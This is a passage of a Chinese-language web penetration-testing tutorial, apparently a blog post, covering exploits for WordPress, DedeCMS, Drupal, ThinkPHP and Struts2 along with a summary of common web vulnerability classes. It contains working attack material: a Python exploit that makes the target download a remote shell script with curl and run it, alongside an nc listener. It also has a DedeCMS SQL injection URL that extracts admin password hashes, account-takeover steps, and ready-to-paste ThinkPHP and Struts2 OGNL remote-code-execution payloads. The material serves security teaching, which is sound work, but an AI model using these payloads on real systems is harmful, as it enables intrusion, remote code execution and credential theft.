# Put your command in a website, and use the website's url
# don't contains "http://", must be all lowercase
shell_url = '192.168.0.141:8000/1.txt' if len(sys.argv) < 2 else sys.argv[2]
# an exists user
user = 'admin'
def generate_command(command):
    command = '${run{%s}}' % command
    command = command.replace('/', '${substr{0}{1}{$spool_directory}}')
    command = command.replace(' ', '${substr{10}{1}{$tod_log}}')
    return 'target(any -froot@localhost -be %s null)' % command

session = requests.session()
data = {
    'user_login': user,
    'redirect_to': '',
    'wp-submit': 'Get New Password'
}
session.headers = {
    'Host': generate_command('/usr/bin/curl -o/tmp/rce ' + shell_url),
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
}
session.allow_redirects = False
target += '/wp-login.php?action=lostpassword'
session.post(target, data=data)
session.headers['Host'] = generate_command('/bin/bash /tmp/rce')
session.post(target, data=data)
```

进行 nc 监听

```bash
root@kail:~# nc -v -l 1995
```

执行 exp

```bash
root@kail:~# python3 exploit.py "http://192.168.86.200:8080" "192.168.86.200/shell.sh"
```

## 02-DedeCMS 漏洞

织梦内容管理系统是国内最知名的PHP 开源网站管理系统，以简单、实用和开源而闻名，是使用用户最多的 PHP 类CMS 系统。织梦是基于 PHP+MySQL 技术架构，适用于个人网站或中小型门户网站的构建 。

### 01-DedeCMSV5.6

访问`ip/plus/search.php?keyword as&typeArr [ uNion ]=a`结果若出现`Safe Alert: Request Error step 1`

```
访问ip/plus/search.php?keyword=as&typeArr[111% 3D@`\\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)% 23@`\\'`+]=a
```

可以看到EXP 攻击后出现后台管理员账号 admin 信息以及经过 MD5 加密的密文，解密后找到后台地址ip/dede登录

### 02-DedeCMS V57 版本漏洞-前台用户密码重置

点击忘记密码，使用POST方法，数据： `dopost=safequestion&safequestion=0.0&safeanswer=&id=1`
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062917193839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

重置连接：ip/resetpassword.php?dopost getpasswd&id =1&3JdOa0iv（key 需要通过构造 POST 获取）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629172003146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

### 03-DedeCMS V57 版本漏洞-任意修改后台密码

由 admin 用户无法登录，因此无法直接修改密码，任意注册用户，BurpSuit抓包
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629172014798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

用户成为admin，重置密码后，登录后台

### 04-DedeCMS V57 版本漏洞-后台任意文件上传

查看允许文件上传类型，在最左侧找到核心中的附件管理上传php文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629172033336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

## 03-Drupal 漏洞

Drupal是使用 PHP 语言编写的开源内容管理框架CMF ），它由内容管理系统 CMS ）和 PHP 开发框架Framework ）共同构成，能支持从个人博客到大型社区驱动的网站等各种不同应用的网站项目 。

### 01-CVE-2014-3704 SQL 注入攻击

在登录模块输入账号密码抓取POST 数据包，，该注入语句为报错注入，报错信息中有当前数据库的名字
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629172048509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

### 02-CVE-2018-7600 任意代码执行漏洞

Drupal中带有默认或通用模块配置的多个子系统存在安全漏洞。远程攻击者可利用该漏洞执行任意代码。以下版本受到影响： Drupal 7.58 之前版本， 8.3.9 之前的 8.x 版本， 8.4.6 之前的 8.4.x 版本， 8.5.1 之前的 8.5.x 版本 。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629172100466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

# 12-web渗透测试-TOP10漏洞

## 01-注入漏洞

用户可以通过任何可输入的点输入构造的恶意代码，若应用程序对用户的输入过滤不严，一旦将输入的恶意代码作为命令或查询的一部分发送到了解析器，则可能会导致注入漏洞的产生。

注入方式

- 联合查询
- 报错注入
- 布尔盲注
- 延时注入
- DNS外带
- 堆叠注入
- 二次注入
- 宽字节注入
  
  

## 02-跨站脚本（ XSS ）漏洞

攻击者对漏洞服务器发起XSS 攻击，注入JS 代码：`<script>alert(XSS ’’);</script>`，普通用户浏览XSS 页面

## 03-文件上传漏洞

应用中存在上传功能，但是上传的文件没有经过严格的合法性检验或者检验函数存在缺陷，导致可以上传木马文件到服务器。

## 04-文件包含漏洞

文件包含函数包含文件参数没有经过过滤或者严格的定义 并且参数可以被用户控制 就可能包含非预期的文件 。 如果文件中存在恶意代码 无论文件是什么样的后缀类型 文件内的恶意代码都会被解析执行 就导致了文件包含漏洞对产生 。如：127.0.0.1/1.php?x=a.php

## 05-命令执行漏洞

攻击者通过浏览器或者其他客户端软件向 Web 应用程序 提交系统命令 ，并成功执行。漏洞的关键还是对用户输入的内容 未做严格交验导致 。

命令执行函数

- system()
- exec()
- shell_exec()
- passthru()
- popen()
  
  

## 06-代码执行漏洞

当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞。

PHP

- preg_replace
- assert
- eval

JSP

使用基于反射机制的表达式引擎，如0GNL SpEL MVEL等

ASP

- executeglobal
- execute
- eval

## 07-XML外部实体（ XXE ）漏洞

XXE 就是 XML 外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。

## 08-反序列化漏洞

反序列化漏洞是暴露或间接暴露反序列化 API ，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。如：Object(对象)->Serialization(序列化)->File，Database，Network->Deserialization(反序列化)->Object

## 09-SSRF 漏洞

攻击者利用 SSRF 漏洞通过服务器发起伪造请求，这样就可以访问到内网的数据，进行内网信息探测或者内网漏洞利用。

## 10-解析漏洞

Web 容器解析漏洞会将其他类型的文件，都当做该脚本语言的文件进行解析，执行里面的代码。

- IIS6.0将 xx.asp;.jpg 解析为 asp
- Apache将 xx.php.php123 解析为 php
- Nginx将 xx.jpg/.php 解析为 php 。

# 13-web渗透测试-框架漏洞

## 01-ThinkPHP 框架漏洞

ThinkPHP是一个开源的 PHP 框架，是为了简化企业级应用开发和敏捷 WEB 应用开发而诞生的。

### 01-ThinkPHP2.x 命令执行漏洞

在ThinkPHP 2.x 版本中，程序使用了 preg_replace 函数危险的【 /e 】修饰符，【 /e 】修饰符会使 preg_replace 函数将用户输入的参数执行，从而造成任意代码执行漏洞 。代码如下

`$res=preg_replace('@(\w+)'.$depr.'(^'.$depr.'\/]+)@e','$var[\'\\1\']="\\2";',implode($depr,$paths));`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629172132361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

### 02-ThinkPHP5.0 命令执行漏洞

在ThinkPHP5.0 版本表单请求类型伪装中，通过`$_POST['_method']`来传递真实的请求方法，攻击者可以通过 POST 传递_method=__construct 来对 Request 类的 method 方法进行覆盖。当攻击者将 filter 变量覆盖为 system 函数时即可任意代码执行漏洞。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629172212580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

### 03-ThinkPHP5.x 命令执行漏洞

由于框架对控制器没有正确处理检测，导致在网站没有开启强制路由的情况下可能会导致命令执行，payload：`index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062917215546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

## 02-Struts2 框架漏洞

Struts2是一个基于 MVC 设计模式的 Web 应用框架，它本质上相当于一个 servlet ，在 MVC 设计模式中，Struts2 作为控制器(controller)来建立模型与视图的数据交互。

| 注入点                   | 注入代码写法                                          |
| ------------------------ | ----------------------------------------------------- |
| request参数名、 cookie名 | (ognl)(constant) = value & (constant)((ognl1)(ognl2)) |
| request参数值            | %{ognl}、${ognl}、'ognl'、(ognl)                      |
| request的filename        | %{ognl}、${ognl}                                      |
| request的URL             | /%{ognl}.action、/${ognl}.action                      |
| Request的content-type    | %{ognl}、${ognl}                                      |

### 01-s2-003漏洞

XWork ParameterInterceptors旁路允许执行 OGNL 语句， OGNL 除其他功能外，还提供了广泛的表达式评估功能。该漏洞允许恶意用户绕过ParametersInterceptor 内置的【＃】使用保护，从而能够操纵服务器端上下文对象 。

```
http://127.0.0.1:8080/struts2-showcase-2.0.1/showcase.action?('\u0023context[ \'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629172328643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

### 02-s2-005漏洞

S2-005 是由于官方在修补 S2-003不全面导致绕过补丁造成的。我们都知道访问 Ognl 的上下文对象必须要使用#符号， S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023 或者8进制\43 绕过。S2-005 则是绕过官方的安全配置（禁止静态方法调用和类方法执行）再次造成漏洞。

```
('%5C43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('%5C43context[%5C'xwork.MethodAccessor.denyMethodExecution%5C']%5C75false')(b))&('%5C43c')(('%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET')(c))&(g)(('%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('%5C43xman.getWriter().print(%22S2-005dir--***%22)')(d))&(i95)(('%5C43xman.getWriter().println(%5C43req.getRealPath(%22\%22))')(d))&(i99)(('%5C43xman.getWriter().close()')(d))
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629172419469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

### 03-S2-045/S2-046 漏洞

Struts2使用基于 Jakarta 的文件上传 Multipart解析器，如果该 Content-Type 值无效，则会引发异常，然后将其用于向用户显示错误消息，并对异常信息进行 OGNL 表达式处理，可以构造恶意Content-Type 值执行 RCE 攻击。 S2 -046 与 S2-045 漏洞的引发原因一致，只是他们的利用位置不一样。
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062917234754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

### 04-S2-057 漏洞

2018年 8 月 22 日， Apache Strust2 发布最新安全公告， Apache Struts2 存在远程代码执行的高危漏洞S2-057 。该漏洞是由于在 Struts2 开发框架中使用namespace 功能定义 XML 配置时， namespace 值未被设置且在上层动作配置（ Action Configuration ）中未设置或用通配符 namespace ，可能导致远程代码执行。同理， URL 标签未设置 value 和 action 值且上层动作未设置或用通配符 namespace 时也可能导致远程代码执行。

```
${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.get
ExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apac
he.commons.io.IOUtils@toString(#a.getInputStream()))}
```

ApacheStruts 版本 2.3 至2.3.34 和 2.5 至 2.5.16 当alwaysSelectFullNamespace 为true 时 可能会受到远程执行代码（由用户或诸如 ConventionPlugin 之类的插件使用 ），同时使用没有设置值和操作的 URL 标记时也可能导致远程代码执行。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629172434181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTYxNjU4,size_16,color_FFFFFF,t_70#pic_center)

